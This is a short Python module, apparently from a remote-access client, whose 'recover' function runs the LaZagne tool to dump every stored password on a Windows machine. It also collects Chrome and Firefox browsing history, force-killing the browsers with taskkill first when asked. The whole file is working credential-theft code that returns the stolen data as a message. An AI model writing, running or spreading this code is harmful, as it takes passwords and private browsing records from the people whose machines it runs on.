import contextlib
import io
import os

from foreign.client_handling.browserhistory.browserhistory import get_browserhistory
from foreign.client_handling.lazagne.config.write_output import StandardOutput
from foreign.client_handling.lazagne.config.constant import constant
from foreign.client_handling.lazagne.config.run import run_lazagne

constant.st = StandardOutput()


def runLaZagne(category_selected='all', subcategories={}, password=None):
	for pwd_dic in run_lazagne(category_selected=category_selected, subcategories=subcategories, password=password):
		yield pwd_dic


def recover(action_type, force):
	if action_type == 'password':
		with io.StringIO() as stdout, contextlib.redirect_stdout(stdout):
			for r in runLaZagne(): pass
			return {'message': stdout.getvalue().strip()}
	elif action_type == 'history':
		if force:
			for browser in ('chrome', 'firefox'):
				os.system(f'tasklist | find /i "{browser}.exe" > nul && taskkill /im {browser}.exe /F > nul')
		
		return {'message': get_browserhistory()}
	else:
		raise Exception('Error message')